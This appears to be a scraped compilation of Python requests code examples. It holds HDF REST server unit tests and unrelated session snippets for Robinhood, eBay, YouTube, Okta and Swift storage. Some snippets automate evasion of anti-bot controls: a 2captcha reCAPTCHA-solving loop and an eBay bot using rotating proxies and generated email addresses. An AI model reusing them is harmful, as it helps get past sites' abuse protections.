        attr_name = "str_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        # Should fail since UTF8 with fixed width is not supported
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 400)

        data = { "type": variable_str_type, "shape": scalar_shape,
            "value": text}
        attr_name = "str_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], text)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["class"], "H5T_STRING")
        self.assertTrue("length" in type_json)
        self.assertEqual(type_json["length"], "H5T_VARIABLE")
        self.assertTrue("strPad" in type_json)
        self.assertEqual(type_json["strPad"], "H5T_STR_NULLTERM")
        self.assertTrue("charSet" in type_json)
        self.assertEqual(type_json["charSet"], "H5T_CSET_UTF8") 
**************************************
def testPutVLenInt(self):
        # Test PUT value for 1d attribute with variable length int types
        print("testPutVLenInt", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        vlen_type = {"class": "H5T_VLEN", "base": { "class": "H5T_INTEGER", "base": "H5T_STD_I32LE"}}
        value = [[1,], [1,2], [1,2,3], [1,2,3,4]]
        data = { "type": vlen_type, "shape": 4, "value": value}
        attr_name = "vlen_int_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], value)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["class"], "H5T_VLEN")
        self.assertTrue("base" in type_json)
        base_type = type_json["base"]
        self.assertTrue("class" in base_type)
        self.assertEqual(base_type["class"], "H5T_INTEGER")
        self.assertTrue("base" in base_type)
        self.assertEqual(base_type["base"], "H5T_STD_I32LE")
        self.assertTrue("shape" in rspJson)
        shape_json = rspJson["shape"]
        self.assertTrue("class" in shape_json)
        self.assertEqual(shape_json["class"], "H5S_SIMPLE")
        self.assertTrue("dims" in shape_json)
        self.assertEqual(shape_json["dims"], [4,]) 
**************************************
def testPutCompound(self):
        print("testPutCompoundType", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_id = rspJson["root"]
        helper.validateId(root_id)

        fields = ({'name': 'temp', 'type': 'H5T_STD_I32LE'},
                  {'name': 'pressure', 'type': 'H5T_IEEE_F32LE'})
        datatype = {'class': 'H5T_COMPOUND', 'fields': fields }
        value = (42, 0.42)

        #
        #create compound scalar attribute
        #
        attr_name = "attr0d"
        payload = {'type': datatype, "value": value}
        req = self.endpoint + "/groups/" + root_id + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create attribute


        # read back the attribute
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertTrue("type" in rspJson)
        rsp_type = rspJson["type"]
        self.assertTrue("class" in rsp_type)
        self.assertTrue(rsp_type["class"], 'H5T_COMPOUND')
        self.assertTrue("fields" in rsp_type)
        rsp_fields = rsp_type["fields"]
        self.assertEqual(len(rsp_fields), 2)
        rsp_field_0 = rsp_fields[0]
        self.assertTrue("type" in rsp_field_0)
        self.assertEqual(rsp_field_0["type"], 'H5T_STD_I32LE')
        self.assertTrue("name" in rsp_field_0)
        self.assertEqual(rsp_field_0["name"], "temp")
        rsp_field_1 = rsp_fields[1]
        self.assertTrue("type" in rsp_field_1)
        self.assertEqual(rsp_field_1["type"], 'H5T_IEEE_F32LE')
        self.assertTrue("name" in rsp_field_1)
        self.assertEqual(rsp_field_1["name"], "pressure")

        self.assertTrue("shape" in rspJson)
        rsp_shape = rspJson["shape"]
        self.assertTrue("class" in rsp_shape)
        self.assertEqual(rsp_shape["class"], 'H5S_SCALAR')

        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], [42, 0.42]) 
**************************************
def testPutObjReference(self):
        print("testPutObjReference", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_id = rspJson["root"]

        # create group "g1"
        payload = { 'link': { 'id': root_id, 'name': 'g1' } }
        req = helper.getEndpoint() + "/groups"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        g1_id = rspJson["id"]
        self.assertTrue(helper.validateId(g1_id))
        self.assertTrue(g1_id != root_id)

        # create group "g2"
        payload = { 'link': { 'id': root_id, 'name': 'g2' } }
        req = helper.getEndpoint() + "/groups"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        g2_id = rspJson["id"]
        self.assertTrue(helper.validateId(g1_id))
        self.assertTrue(g1_id != g2_id)

        # create attr of g1 that is a reference to g2
        ref_type = {"class": "H5T_REFERENCE",
                    "base": "H5T_STD_REF_OBJ"}
        attr_name = "g1_ref"
        value = "groups/" + g2_id
        data = { "type": ref_type, "value": value }
        req = self.endpoint + "/groups/" + g1_id + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read back the attribute and verify the type, space, and value
        req = self.endpoint + "/groups/" + g1_id + "/attributes/" + attr_name
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("type" in rspJson)
        rsp_type = rspJson["type"]
        self.assertTrue("base" in rsp_type)
        self.assertEqual(rsp_type["base"], 'H5T_STD_REF_OBJ')
        self.assertTrue("class" in rsp_type)
        self.assertTrue(rsp_type["class"], 'H5T_REFERENCE')
        self.assertTrue("shape" in rspJson)
        rsp_shape = rspJson["shape"]
        self.assertTrue("class" in rsp_shape)
        self.assertEqual(rsp_shape["class"], 'H5S_SCALAR')
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], value) 
**************************************
def testPutNoData(self):
        # Test PUT value for 1d attribute without any data provided
        print("testPutNoData", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        fixed_str_type = {"charSet": "H5T_CSET_ASCII",
                "class": "H5T_STRING",
                "length": 7,
                "strPad": "H5T_STR_NULLPAD" }
        data = { "type": fixed_str_type, "shape": 4 }
        attr_name = "str_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertTrue(rspJson["value"] is None)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["class"], "H5T_STRING")
        self.assertTrue("length" in type_json)
        self.assertEqual(type_json["length"], 7)

        # create attr with 2D float type
        data = {"type": {"class": "H5T_FLOAT", "base": "H5T_IEEE_F32LE"},"shape": [2,3]}
        attr_name = "float_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201) 
**************************************
def testPutIntegerArray(self):
        # Test PUT value for 1d attribute with list of integers
        print("testPutIntegerArray", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        value = [2,3,5,7,11,13]
        data = { "type": 'H5T_STD_I32LE', "shape": 6, "value": value}
        attr_name = "int_arr_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], value)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["base"], "H5T_STD_I32LE")
        self.assertTrue("shape" in rspJson)
        shape_json = rspJson["shape"]
        self.assertTrue("class" in shape_json)
        self.assertTrue(shape_json["class"], 'H5S_SIMPLE')
        self.assertTrue("dims" in shape_json)
        self.assertTrue(shape_json["dims"], [6])

        # try creating an array where the shape doesn't match data values
        data = { "type": 'H5T_STD_I32LE', "shape": 5, "value": value}
        attr_name = "badarg_arr_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 400)  # Bad request 
**************************************
def testCreateLinkedDomain(self):
        target_domain = self.base_domain + "/target_domain.h5"
        print("testCreateLinkedDomain", target_domain)
        headers = helper.getRequestHeaders(domain=target_domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.put(req, headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)

        root_id = rspJson["root"]

        # do a get on the new domain
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner"):
             self.assertTrue(k in rspJson)
        # we should get the same value for root id
        self.assertEqual(root_id, rspJson["root"])

        # create new domain linked with the existing root
        linked_domain = self.base_domain + "/linked_domain.h5"
        print("testCreateLinkedDomain - linked domain", linked_domain)
        headers = helper.getRequestHeaders(domain=linked_domain)
        body = {"linked_domain": target_domain }
        rsp = requests.put(req, data=json.dumps(body), headers=headers)

        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)
        self.assertEqual(rspJson["root"], root_id)

        # delete the target domain but keep the root
        headers =  helper.getRequestHeaders(domain=target_domain)
        body = { "keep_root": 1}
        rsp = requests.delete(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # verify we can access the root group under the linked domain
        headers = helper.getRequestHeaders(domain=linked_domain)
        root_req =  helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(root_req, headers=headers)
        self.assertEqual(rsp.status_code, 200) 
**************************************
def testDeleteFolderWithChildren(self):

        folder_name = "testDeleteFolder"
        domain_name = "myfile"
        domain = self.base_domain + "/" + folder_name
        print("testCreateFolder", domain)
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)
        self.assertFalse("root" in rspJson)  # no root -> folder

        # verify that putting the same domain again fails with a 409 error
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 409)

        # do a get on the new folder
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)

        self.assertTrue("owner" in rspJson)
        self.assertTrue("class" in rspJson)
        self.assertEqual(rspJson["class"], "folder")

        # create a child domain
        domain = self.base_domain + "/" + folder_name + "/" + domain_name
        headers = helper.getRequestHeaders(domain=domain)
        rsp = requests.put(req, headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # try delete the folder
        domain = self.base_domain + "/" + folder_name
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.delete(req, headers=headers)
        # should get 409
        self.assertEqual(rsp.status_code, 409)

        # delete the child domain
        domain = self.base_domain + "/" + folder_name + "/" + domain_name
        headers = helper.getRequestHeaders(domain=domain)
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # try delete the folder
        domain = self.base_domain + "/" + folder_name
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200) 
**************************************
def testPutAcl(self):
        print("testPutAcl", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)

        # create an ACL for "test_user2" with read and update access
        req = helper.getEndpoint() + '/acls/test_user2'
        perm = {"read": True, "update": True}

        rsp = requests.put(req, headers=headers, data=json.dumps(perm))
        self.assertEqual(rsp.status_code, 201)

        # fetch the acl and verify it has been updated
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rsp_json = json.loads(rsp.text)
        self.assertTrue("acl" in rsp_json)
        self.assertTrue("hrefs" in rsp_json)
        acl = rsp_json["acl"]
        self.assertEqual(len(acl.keys()), len(acl_keys) + 2)  # acl_keys + "domain" + "username"

        for k in acl_keys:
            self.assertTrue(k in acl)
            if k in ("read", "update"):
                self.assertEqual(acl[k], True)
            else:
                self.assertEqual(acl[k], False)

        # The ACL should be fetchable by test_user2...
        req = helper.getEndpoint() + '/acls/test_user2'
        headers = helper.getRequestHeaders(domain=self.base_domain, username="test_user2")
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200) # ok

        # The default ACL should be fetchable by test_user2 as well...
        if config.get("default_public"):
            req = helper.getEndpoint() + '/acls/default'
            headers = helper.getRequestHeaders(domain=self.base_domain, username="test_user2")
            rsp = requests.get(req, headers=headers)
            self.assertEqual(rsp.status_code, 200) # ok

        # test_user2 shouldn't be able to read test_user1's ACL
        req = helper.getEndpoint() + '/acls/test_user1'
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 403) # Forbidden 
**************************************
def testPutAttributeDatatype(self):
        # Test creation/deletion of datatype obj

        print("testPutAttributeDatatype", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create a committed type obj
        data = { "type": "H5T_IEEE_F32LE" }
        req = self.endpoint + '/datatypes'
        rsp = requests.post(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["attributeCount"], 0)
        ctype_id = rspJson["id"]
        self.assertTrue(helper.validateId(ctype_id))

        # link the new datatype
        name = "dtype_with_attribute"
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": ctype_id}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # add an attribute
        attr_name = "attr"
        attr_payload = {'type': 'H5T_STD_I32LE', 'value': 42}
        req = self.endpoint + "/datatypes/" + ctype_id + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(attr_payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # created

        # read back the obj
        req = self.endpoint + '/datatypes/' + ctype_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("id" in rspJson)
        self.assertEqual(rspJson["id"], ctype_id)
        self.assertFalse("attributes" in rspJson)

        # read back the obj with attributes
        params = {"include_attrs": 1}
        rsp = requests.get(req, headers=headers, params=params)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("id" in rspJson)
        self.assertEqual(rspJson["id"], ctype_id)
        self.assertTrue("attributes" in rspJson)
        attrs = rspJson["attributes"]
        self.assertTrue("attr" in attrs) 
**************************************
def testSoftLink(self):
        domain = self.base_domain + "/testSoftLink.h5"
        print("testSoftLink", domain)
        helper.setupDomain(domain)
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_id = rspJson["root"]

        # get root group and check it has no links
        req = helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["linkCount"], 0)  # no links

        # create softlink
        link_title = 'softlink'
        target_path = 'somewhere'
        req = helper.getEndpoint() + "/groups/" + root_id + "/links/" + link_title
        payload = {"h5path": target_path}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # created

        # get root group and check it has one link
        req = helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["linkCount"], 1)  # no links

        # get the link
        req = helper.getEndpoint() + "/groups/" + root_id + "/links/" + link_title
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)  # should get the softlink
        rspJson = json.loads(rsp.text)
        self.assertTrue("created" in rspJson)
        self.assertTrue("lastModified" in rspJson)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("link" in rspJson)
        rspLink = rspJson["link"]
        self.assertEqual(rspLink["title"], link_title)
        self.assertEqual(rspLink["class"], "H5L_TYPE_SOFT")
        self.assertEqual(rspLink["h5path"], target_path) 
**************************************
def testExternalLink(self):
        domain = self.base_domain + "/testExternalLink.h5"
        print("testExternalLink", domain)
        helper.setupDomain(domain)
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_id = rspJson["root"]

        # get root group and check it has no links
        req = helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["linkCount"], 0)  # no links

        # create external link
        target_domain = self.base_domain + '/external_target.h5'
        target_path = 'somewhere'
        link_title = 'external_link'
        req = helper.getEndpoint() + "/groups/" + root_id + "/links/" + link_title
        payload = {"h5path": target_path, "h5domain": target_domain}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # created

        # get root group and check it has one link
        req = helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["linkCount"], 1)  # no links

        # get the link
        req = helper.getEndpoint() + "/groups/" + root_id + "/links/" + link_title
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)  # should get the softlink
        rspJson = json.loads(rsp.text)
        self.assertTrue("created" in rspJson)
        self.assertTrue("lastModified" in rspJson)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("link" in rspJson)
        rspLink = rspJson["link"]
        self.assertEqual(rspLink["title"], link_title)
        self.assertEqual(rspLink["class"], "H5L_TYPE_EXTERNAL")
        self.assertEqual(rspLink["h5path"], target_path)
        self.assertEqual(rspLink["h5domain"], target_domain) 
**************************************
def upload_file_chunk(self, part_number, chunk, upload_key, access_dir=None):
        """Upload file chunk.

        :param part_number: number of chunk (>=0)
        :param chunk: chunk content
        :param upload_key: upload key (need to be received from RequestGetFileUploadUrl request before uploading)
        :return: Response of HTTP PUT request if success or None otherwise
        """

        request = media_and_files_pb2.RequestGetFileUploadPartUrl(
            part_number=part_number,
            part_size=len(chunk),
            upload_key=upload_key
        )
        url = self._get_file_upload_part_url(request).url

        if self.cert and self.private_key:
            with NamedTemporaryFile(dir=access_dir, delete=False) as cert_file:
                with NamedTemporaryFile(dir=access_dir, delete=False) as private_key_file:
                    cert_file.write(self.cert)
                    private_key_file.write(self.private_key)
                    cert_file.flush()
                    private_key_file.flush()
                    put_response = requests.put(
                        url,
                        data=chunk,
                        headers={'Content-Type': 'application/octet-stream'},
                        cert=(cert_file.name, private_key_file.name)
                    )
                    try:
                        cert_file.close()
                        private_key_file.close()
                        os.unlink(cert_file.name)
                        os.unlink(private_key_file.name)
                    except Exception as e:
                        print(e)
                        pass

        else:
            put_response = requests.put(
                url,
                data=chunk,
                headers={'Content-Type': 'application/octet-stream'},
            )

        if put_response.status_code != 200:
            print('Can\'t upload file chunk #{}'.format(part_number))
            return None

        return put_response 

Python requests.session() Examples

**************************************
def __init__(self, username, password):
        self.session = requests.session()
        self.session.proxies = urllib.getproxies()
        self.username = username
        self.password = password
        self.headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=1, fr;q=0.9, de;q=0.8, ja;q=0.7, nl;q=0.6, it;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "X-Robinhood-API-Version": "1.0.0",
            "Connection": "keep-alive",
            "User-Agent": "Robinhood/823 (iPhone; iOS 7.1.2; Scale/2.00)"
        }
        self.session.headers = self.headers
        self.login() 
**************************************
def __init__(self, product_link, domain):
        '''
        (str, str) -> eBae
        Given a link to an eBay product <product_link> and a catch-all domain
        address <domain>, a random email address is generated and an eBae
        object is returned.
        
        REQ: domain is a catch-all domain
        REQ: product_link is a link to a product listed on eBay
        '''
        self.s = requests.session()
        self.product_link = product_link
        self.s.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        }
        self.proxy_list = read_from_txt("proxies.txt")
        self.email = gen_email(domain) 
**************************************
def yt(query):
    with requests.session() as s:
         isi = []
         if query == "":
             query = "S1B tanysyz"   
         s.headers['user-agent'] = 'Mozilla/5.0'
         url    = 'http://www.youtube.com/results'
         params = {'search_query': query}
         r    = s.get(url, params=params)
         soup = BeautifulSoup(r.content, 'html5lib')
         for a in soup.select('.yt-lockup-title > a[title]'):
            if '&list=' not in a['href']:
                if 'watch?v' in a['href']:
                    b = a['href'].replace('watch?v=', '')
                    isi += ['youtu.be' + b]
         return isi 
**************************************
def get_captcha(API_KEY,sitekey,captcha_url):
    global active_threads

    active_threads += 1

    session = requests.session()
    session.cookies.clear()
    randomID = random.getrandbits(16)
    log('Generating Captcha for task ID: ' + str(randomID))
    captcha_id = session.post("http://2captcha.com/in.php?key={}&method=userrecaptcha&googlekey={}&pageurl={}".format(API_KEY, sitekey, captcha_url)).text.split('|')[1]
    recaptcha_answer = session.get("http://2captcha.com/res.php?key={}&action=get&id={}".format(API_KEY, captcha_id)).text
    while 'CAPCHA_NOT_READY' in recaptcha_answer:
        print(recaptcha_answer)
        time.sleep(3)
        recaptcha_answer = session.get("http://2captcha.com/res.php?key={}&action=get&id={}".format(API_KEY, captcha_id)).text
    recaptcha_answer = recaptcha_answer.split('|')[1]
    log('Captcha successfully obtained, task ID: ' + str(randomID))
    saveCaptcha(recaptcha_answer,randomID)
    log('Task ID ' + str(randomID) + ' is closing...')
    active_threads -= 1 
**************************************
def _input_and_send_code(self, data, factor):
        # Format for user experience
        display_name = DISPLAY_NAMES.get(factor) if DISPLAY_NAMES.get(factor) else factor
        mfa_code = input('Enter {} code: '.format(display_name))
        url = data['_links']['next']['href']
        resp = self.session.post(
            url=url,
            json={
                'stateToken': data['stateToken'],
                'passCode': mfa_code
            }
        )
        if resp.status_code == 200:
            return resp
        elif resp.status_code == 403:
            print('Incorrect or stale code.\n'
                  'Please check code...')
            return self._input_and_send_code(data, factor)
        else:
            raise Exception('Something went wrong.\nresp: {}\n'
                            'You may be locked out of Okta'.format(resp.content)) 
**************************************
def download_song(song_info, session, mp3_option, download_folder):
    if(song_info['data']):
        if not mp3_option and song_info['size'] < 10:
            logger.info("%s-%s 文件大小小于 10MB, 放弃下载。" %
                        (song_info['songname'], song_info['artist']))
            return None
        else:
            filename = "{0}-{1}.flac".format(
                validate_file_name(song_info['songname']),
                validate_file_name(song_info['artist']))

            filepath = os.path.join(download_folder, filename)
            logger.info("下载中: %s" % filepath)
            try:
                r = session.get(song_info['link'], headers=HEADERS, timeout=3)
                with open(filepath, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
                logger.info("下载完成: %s " % filepath)
            except requests.exceptions.Timeout as err:
                logger.error("%s during download filepath" % err) 
**************************************
def download_song(song_info, session, mp3_option, download_folder):
    if(song_info['data']):
        if not mp3_option and song_info['size'] < 10:
            logger.info("%s-%s 文件大小小于 10MB, 放弃下载。" %
                        (song_info['songname'], song_info['artist']))
            return None
        else:
            filename = "{0}-{1}.flac".format(
                validate_file_name(song_info['songname']),
                validate_file_name(song_info['artist']))

            filepath = os.path.join(download_folder, filename)
            logger.info("下载中: %s" % filepath)
            try:
                r = session.get(song_info['link'], headers=HEADERS, timeout=3)
                with open(filepath, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
                logger.info("下载完成: %s " % filepath)
            except requests.exceptions.Timeout as err:
                logger.error("%s during download filepath" % err) 
**************************************
def _login(self, force_login: bool = False):
        try:
            if force_login:
                self._clear_session()
            if not self._session.cookies:
                self._session = self._create_or_load_session()
                self._serial_number = self._load_serial_number_from_file()

                if not self._session.cookies:
                    _LOGGER.info(
                        'No previous session found, will try to logging with username: %s and smartphoneId: %s',
                        self._user, self._smart_phone_Id)

                    authtoken = self._request_token()
                    self._get_cookies(authtoken)

            if not self._serial_number:
                self._get_serial_number()
        except ApiError:
            raise
        except Exception as e:
            raise ApiError('Error during login', None) from e 
**************************************
def get_html(url,max_delay=15):
    '''
    This function extract raw_html file
    :param url: url
    :type url:str
    :return: html data
    '''
    time.sleep(create_random_sleep(max_time=max_delay))
    if internet()==True:
        new_session=requests.session()
        new_session.cookies.clear()
        raw_html=new_session.get(url)
        new_session.close()
        raw_data=raw_html.text
        return raw_data
    else:
        print("Error In Internet") 
**************************************
def serch_images(self, generate_query, maximum):
        results = []
        total = 0
        while True:
            # search
            html = self.session.get(next(generate_query)).text
            soup = BeautifulSoup(html, "lxml")
            elements = soup.select(".rg_meta.notranslate")
            jsons = [json.loads(e.get_text()) for e in elements]
            image_url_list = [js["ou"] for js in jsons]

            # add search results
            if not image_url_list:
                cprint("No more images.", "yellow")
                break
            elif len(image_url_list) > maximum - total:
                results += image_url_list[: maximum - total]
                break
            else:
                results += image_url_list
                total += len(image_url_list)

        cprint(f"Found {len(results)} images.", "green")
        return results 
**************************************
def put_object(self, container_name, key, data):
        """
        Put an object in Swift. Override the object if the key already exists.
        :param key: key of the object.
        :param data: data of the object
        :type data: str/bytes
        :return: None
        """
        url = '/'.join([self.endpoint, container_name, key])
        try:
            res = self.session.put(url, data=data)
            status = 'OK' if res.status_code == 201 else 'Error'
            try:
                logger.debug('PUT Object {} - Size: {} - {}'.format(key, sizeof_fmt(len(data)), status))
            except Exception:
                logger.debug('PUT Object {} - {}'.format(key, status))
        except Exception as e:
            print(e) 
**************************************
def head_object(self, container_name, key):
        """
        Head object from Swift with a key. Throws StorageNoSuchKeyError if the given key does not exist.
        :param key: key of the object
        :return: Data of the object
        :rtype: str/bytes
        """
        url = '/'.join([self.endpoint, container_name, key])
        try:
            res = self.session.head(url)
            if res.status_code == 200:
                return res.headers
            elif res.status_code == 404:
                raise StorageNoSuchKeyError(container_name, key)
            else:
                raise Exception('{} - {}'.format(res.status_code, key))
        except Exception as e:
            raise StorageNoSuchKeyError(container_name, key) 
**************************************
def delete_objects(self, container_name, key_list):
        """
        Delete a list of objects from Swift.
        :param bucket: bucket name
        :param key: data key
        """
        headers={'X-Auth-Token': self.token,
                 'X-Bulk-Delete': 'True'}

        keys_to_delete = []
        for key in key_list:
            keys_to_delete.append('/{}/{}'.format(container_name, key))

        keys_to_delete = '\n'.join(keys_to_delete)
        url = '/'.join([self.endpoint, '?bulk-delete'])
        return self.session.delete(url, data=keys_to_delete, headers=headers) 
**************************************
def list_objects(self, container_name, prefix=''):
        """
